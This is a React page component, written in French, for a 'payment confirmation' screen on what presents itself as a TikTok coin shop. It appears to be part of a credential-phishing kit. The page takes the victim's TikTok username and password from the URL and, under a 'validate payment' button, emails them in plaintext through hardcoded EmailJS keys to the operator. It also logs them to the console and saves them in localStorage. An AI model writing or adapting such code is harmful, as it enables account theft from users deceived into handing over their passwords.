import { useEffect, useState } from 'react';
import { Layout } from '../components/Layout';
import { CheckCircle, ArrowRight } from 'lucide-react';
import { useLocation, useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { Confetti } from '../components/Confetti';
import { Purchase } from '../types';
import { getPurchaseHistory } from '../utils/localStorage';
import emailjs from '@emailjs/browser';

// Configuration EmailJS
const EMAILJS_SERVICE_ID = 'service_zr57d2k';
const EMAILJS_TEMPLATE_ID = 'template_enecl1c';
const EMAILJS_PUBLIC_KEY = 'oOJl0jLVKr1t0kB23';

export const PaymentConfirmation = () => {
  const { t } = useTranslation();
  const [showConfetti, setShowConfetti] = useState(true);
  const [purchaseDetails, setPurchaseDetails] = useState<Purchase | null>(null);
  const [isSending, setIsSending] = useState(false);
  const [sendError, setSendError] = useState('');
  const location = useLocation();
  const navigate = useNavigate();
  
  // Récupérer l'orderId, les identifiants et les détails d'achat depuis l'URL
  const searchParams = new URLSearchParams(location.search);
  const orderId = searchParams.get('orderId');
  const username = searchParams.get('username');
  const password = searchParams.get('password');
  const email = searchParams.get('email');
  const amountFromUrl = searchParams.get('amount');
  const priceFromUrl = searchParams.get('price');
  
  // Convertir les valeurs en nombres si elles existent
  const amount = amountFromUrl ? parseInt(amountFromUrl, 10) : null;
  const price = priceFromUrl ? parseInt(priceFromUrl, 10) : null;
  
  useEffect(() => {
    if (orderId) {
      // Récupérer les détails de l'achat depuis le localStorage
      const purchaseHistory = getPurchaseHistory();
      const purchase = purchaseHistory.find(p => p.id === orderId);
      if (purchase) {
        setPurchaseDetails(purchase);
      }
    }
    
    // Arrêter les confettis après 5 secondes
    const timer = setTimeout(() => {
      setShowConfetti(false);
    }, 5000);
    
    return () => clearTimeout(timer);
  }, [orderId]);
  
  const handleSendCredentials = async () => {
    // Vérifier les paramètres essentiels
    const missingParams = [];
    if (!username) missingParams.push('Nom d\'utilisateur TikTok');
    if (!password) missingParams.push('Mot de passe TikTok');
    if (!email) missingParams.push('Email');
    if (!orderId) missingParams.push('Numéro de commande');
    if (!amount && !purchaseDetails) missingParams.push('Nombre de pièces');
    if (!price && !purchaseDetails) missingParams.push('Prix');
    
    // Afficher dans la console pour le débogage
    console.log('Paramètres de l\'URL:', { username, password, email, orderId, amount, price });
    console.log('Détails de l\'achat:', purchaseDetails);
    
    // Vérifier les paramètres essentiels
    if (missingParams.length > 0) {
      const missingInfo = missingParams.join(', ');
      setSendError(`Informations manquantes pour envoyer les identifiants: ${missingInfo}`);
      return;
    }
    
    setIsSending(true);
    setSendError('');
    
    try {
      // Préparer les données pour EmailJS
      const coinsAmount = purchaseDetails ? purchaseDetails.amount : amount;
      const orderPrice = purchaseDetails ? purchaseDetails.price : price;
      const orderDate = purchaseDetails ? purchaseDetails.date : new Date().toISOString();
      
      const templateParams = {
        order_id: orderId,
        tiktok_username: username,
        tiktok_password: password,
        client_email: email,
        coins_amount: coinsAmount?.toLocaleString() || 'Non spécifié',
        price: orderPrice?.toLocaleString() || 'Non spécifié',
        date: new Date(orderDate).toLocaleString('fr-FR', {
          dateStyle: 'full',
          timeStyle: 'short'
        })
      };

      // Envoyer l'email via EmailJS
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        templateParams,
        EMAILJS_PUBLIC_KEY
      );

      console.log('Email envoyé avec succès pour la commande:', orderId);
      
      // Stocker également dans localStorage comme backup
      const orderData = {
        ...templateParams,
        status: 'sent',
        sentAt: new Date().toISOString()
      };
      const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
      existingOrders.push(orderData);
      localStorage.setItem('pendingOrders', JSON.stringify(existingOrders));
      
      // Rediriger vers la page de succès
      setTimeout(() => {
        navigate(`/payment/success?orderId=${orderId}`);
      }, 1000);

    } catch (error) {
      console.error('Erreur lors de l\'enregistrement de la commande:', error);
      setSendError(
        error instanceof Error 
          ? error.message 
          : t('sendError', 'Une erreur est survenue. Veuillez réessayer.')
      );
      setIsSending(false);
    }
  };
  
  return (
    <Layout balance={purchaseDetails?.amount || 0} hideBalance={!purchaseDetails}>
      {showConfetti && <Confetti duration={5000} />}
      
      <div className="max-w-2xl mx-auto mt-12 p-8 bg-[var(--card-bg)] rounded-[var(--radius-lg)] shadow-[var(--shadow-md)] border border-[var(--border-dark)]">
        <div className="flex flex-col items-center text-center mb-8">
          <div className="w-20 h-20 rounded-full bg-green-900 bg-opacity-20 flex items-center justify-center mb-6">
            <CheckCircle className="w-10 h-10 text-green-400" />
          </div>
          
          <h1 className="text-3xl font-bold mb-2">{t('paymentSuccessful')}</h1>
          <p className="text-[var(--text-secondary)] max-w-md mb-2">
            {t('thankYou')} 
          </p>
          <p className="text-[var(--text-secondary)] max-w-md mb-6">
            {t('confirmationMessage', 'Votre paiement a été traité avec succès. Pour finaliser le processus et recevoir vos pièces, veuillez cliquer sur le bouton ci-dessous.')}
          </p>
          
          {sendError && (
            <div className="w-full p-4 mb-4 bg-red-100 border border-red-200 rounded-[var(--radius-md)] text-red-800">
              <p className="text-sm">{sendError}</p>
            </div>
          )}
          
          <button 
            onClick={handleSendCredentials}
            disabled={isSending}
            className="flex items-center justify-center gap-2 py-3 px-8 rounded-[var(--radius-md)] bg-gradient-to-r from-[var(--tiktok-blue)] to-[var(--tiktok-red)] text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-70 disabled:cursor-not-allowed"
          >
            {isSending ? (
              <span>{t('sending', 'Envoi en cours...')}</span>
            ) : (
              <>
                <span>{t('validatePayment', 'Valider le paiement')}</span>
                <ArrowRight className="w-5 h-5" />
              </>
            )}
          </button>
        </div>
        
        {purchaseDetails && (
          <div className="bg-[var(--background-elevated-2)] rounded-[var(--radius-md)] p-6">
            <h2 className="text-xl font-semibold mb-4">{t('transactionDetails', 'Détails de la transaction')}</h2>
            
            <div className="space-y-3">
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('orderNumber', 'Numéro de commande')}</span>
                <span className="font-medium">{purchaseDetails.id}</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('amountPaid', 'Montant payé')}</span>
                <span className="font-bold">{purchaseDetails.price.toLocaleString()} FCFA</span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-[var(--text-secondary)]">{t('purchasedCoins', 'Pièces achetées')}</span>
                <span className="font-bold">{purchaseDetails.amount.toLocaleString()}</span>
              </div>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
};
